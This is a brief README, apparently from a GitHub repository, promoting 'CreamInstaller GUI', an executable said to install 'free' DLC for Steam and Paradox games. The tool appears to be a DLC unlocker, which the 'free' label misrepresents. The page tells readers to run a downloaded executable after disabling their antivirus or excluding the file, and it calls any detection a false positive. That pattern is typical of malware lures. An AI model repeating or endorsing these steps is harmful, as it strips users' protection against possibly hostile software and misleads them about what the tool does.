# CreamInstaller GUI – Free Steam & Paradox DLC Installer

**CreamInstaller GUI** is a modern graphical installer for **free DLCs** on Steam and Paradox Launcher games.  
It provides a simple, user-friendly interface to download and install DLCs without manual configuration.

## How to Use CreamInstaller GUI

1. Go to the **[Releases](https://github.com/Deusogu/CreamAPI-Installer-GUI/releases)** page.  
2. Download the latest `CreamInstaller GUI.zip`.  
3. **Extract the entire folder** from the ZIP.  
4. Open the extracted folder and run **`CreamInstaller GUI.exe`**.  
5. Follow the on-screen instructions to install the free DLCs for your Steam or Paradox games.  

> ⚠️ **Antivirus Warning:** Some antivirus programs may flag the installer as a false positive.  
> To avoid issues:  
> - Temporarily disable your antivirus **or**  
> - Add the extracted folder (or `CreamInstaller GUI.exe`) to your antivirus exclusions before running.
